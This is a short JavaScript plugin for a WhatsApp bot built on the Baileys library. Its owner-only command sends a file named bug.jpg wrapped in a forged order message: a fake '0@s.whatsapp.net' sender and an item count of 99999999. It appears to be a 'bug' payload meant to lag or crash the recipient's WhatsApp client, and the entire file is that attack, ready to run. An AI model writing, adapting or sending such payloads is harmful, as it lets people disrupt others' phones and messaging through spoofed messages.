let { Presence } = require('@adiwajshing/baileys')
let fs = require ('fs')
let handler  = async (m, { conn, text }) => {
	conn.sendFile(m.chat, fs.readFileSync(`./media/images/bug.jpg`), 'error.jpg', '', {	
	  key: {
      remoteJid: '0@s.whatsapp.net',
      fromMe: false,
    }, message: {
      orderMessage: {
        itemCount: 99999999,
        orderTitle: '',
        sellerJid: '0@s.whatsapp.net',
        jpegThumbnail: fs.readFileSync(`./media/images/bug.jpg`)
      }
    }
  })
}
handler.help = []
handler.tags = []
handler.customPrefix = /^[S]/
handler.command = /^(alken)$/i
handler.owner = true
module.exports = handler